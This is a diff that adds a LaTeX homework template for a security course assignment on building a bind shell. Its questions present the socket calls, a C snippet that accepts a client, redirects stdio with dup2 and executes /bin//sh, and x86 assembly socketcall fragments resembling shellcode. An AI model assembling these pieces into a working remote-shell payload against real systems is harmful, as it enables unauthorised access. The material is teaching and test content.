@@ -1,0 +1,202 @@
+\documentclass{article}[9pt]
+
+\usepackage{listings}
+\usepackage{fullpage}
+\usepackage{textcomp}
+
+\lstset{ %
+  basicstyle=\ttfamily\small,
+  commentstyle=\ttfamily\small\emph,
+  upquote=true,
+  framerule=1.25pt,
+  breaklines=true,
+  showstringspaces=false,
+  escapeinside={(*@}{@*)},
+  belowskip=2em,
+  aboveskip=1em,
+}
+
+
+\newenvironment{answerfont}{\fontfamily{qhv}\selectfont}{\par}
+\newenvironment{myanswer}{\begin{mdframed}\begin{answerfont}}{\end{answerfont}\end{mdframed}}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%
+% To add an answer, use the myanswer environment command under \item heading,like
+%
+% \item What is the meaning of life, universe, everything?
+% \begin{mysanswer}
+%   The answer is 42!
+% \end{myanswer}
+%
+% You can also use macro's in your \myanswer if you want to control the
+% formatting. Such as verbatim enviroment or lstlisting environment.
+%
+% BUT(!) I have to be able to read/grade your resulting pdf to give you credit,
+% so make sure your home work is well formatted.
+%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\title{SI485h: HW 05}
+\date{FILL IN THE DUE DATE}
+\author{FILL IN YOUR NAME}
+
+\begin{document}
+
+\maketitle
+\section*{Instructions}
+
+\begin{itemize}
+\item You must submit your homework using this Latex template.
+\item This homework is graded out of 80 points. Point values are associated to each question.
+\end{itemize}
+
+\section*{Questions}
+\label{sec:org8c89f79}
+
+\begin{enumerate}
+\item For each of the socket programming API calls below, provide (a)
+the arguments, (b) the return value, and (c) the function as
+called to set up a reverse shell.
+
+\begin{enumerate}
+\item (3 points) \texttt{socket()}
+
+\item (3 points) \texttt{bind()}
+
+\item (3 points) \texttt{listen()}
+
+\item (3 points) \texttt{accept()}
+\end{enumerate}
+
+\item (3 points) On most Intel, x86 machines, what is the difference between network and host byte order?
+
+\item (5 points) Complete the code for the \texttt{struct sockaddr\_in} such that the host
+will bind to address \texttt{192.168.2.1} on port 582.
+
+\begin{verbatim}
+struct sockaddr_in host_addr;
+memset(&(host_addr), '\0', sizeof(struct sockaddr_in));
+host_addr.sin_family= /* ... */;
+host_addr.sin_port=/* ... */;
+host_addr.sin_addr.s_addr=/* ... */;
+\end{verbatim}
+
+\item (5 points) Explain how the following code snippet connects the newly
+connected client with the newly executed \texttt{/bin/sh}.
+
+\begin{verbatim}
+dup2(client, 0);
+dup2(client, 1);
+dup2(client, 2); 
+\end{verbatim}
+
+\item (5 points) Modify the code snippet below such that multiple clients can
+connect to the remote shell such that a new shell is created for
+each connecting client.
+
+\begin{verbatim}
+client = accept(server,
+                (struct sockaddr *) &client_addr,
+                &sin_size);
+
+dup2(client, 0);
+dup2(client, 1);
+dup2(client, 2);
+char *args[2]={"/bin//sh", NULL};
+execve(args[0], args, NULL);
+\end{verbatim}
+
+\item For each of the socket API calls, translate them to their
+\texttt{socketcall} equivalent. Yes, you may need to declare new
+variables to do this or infer variable type information, such as
+a \texttt{host\_addr} and \texttt{client\_addr} are of type \texttt{sockaddr\_in}.
+
+\begin{enumerate}
+\item (3 points) \texttt{sockfd = socket(AF\_INET, SOCK\_STREAM, IPPROTO\_IP)}
+
+\item (3 points) \texttt{bind(sockfd, \&host\_addr, sizeof(struct sockaddr\_in))}
+
+\item (3 points) \texttt{listen(sockfd,4)}
+
+\item (3 points) \texttt{accept(sockfd, \&client\_addr, \&sin\_size)}
+\end{enumerate}
+
+\item (3 points) Why is it necessary to setup our own syscall method to perform
+socketcall's?
+
+\item Describe the socketcall arguments from the assembly code:
+
+\begin{enumerate}
+\item (5 points)
+
+\begin{verbatim}
+xor ecx,ecx
+mov cl,0x2
+push ecx
+push esi ;sockfd
+mov ecx, esp
+xor ebx,ebx
+mov bl, 0x4
+xor eax,eax
+mov al,0x66
+int 0x80
+\end{verbatim}
+
+\item (5 points) 
+
+\begin{verbatim}
+xor ecx,ecx
+push ecx
+push ecx
+push esi ;sockfd
+mov ecx,esp
+xor ebx,ebx
+mov bl, 0x5
+xor eax,eax
+mov al,0x66
+int 0x80
+mov edi,eax
+\end{verbatim}
+\end{enumerate}
+\begin{enumerate}
+\item (5 points)
+
+\begin{verbatim}
+xor eax,eax
+push eax
+push 0x1
+push 0x2
+mov ecx,esp
+xor ebx,ebx
+mov bl,0x1
+mov al,0x66
+int 0x80
+mov esi,eax
+\end{verbatim}
+
+\item (5 points)
+
+\begin{verbatim}
+xor eax,eax
+push eax
+push WORD 0xbeef
+push WORD 0x02
+mov ecx,esp
+push 0x16
+push ecx
+push esi ;sockfd
+xor ebx,ebx
+mov bl,0x2
+mov ecx,esp
+mov al,0x66
+int 0x80
+\end{verbatim}
+\end{enumerate}
+
+\item (10 points) If register \texttt{edx} stores the value for the socket file
+descriptor (\texttt{sockfd}), and \texttt{ecx} stores the value of an open file
+descriptor. Write the \texttt{dup2()} code in assembly such that all the
+standard file descriptors are from the shell will be duplicated
+to the socket.
+\end{enumerate}
+\end{document}
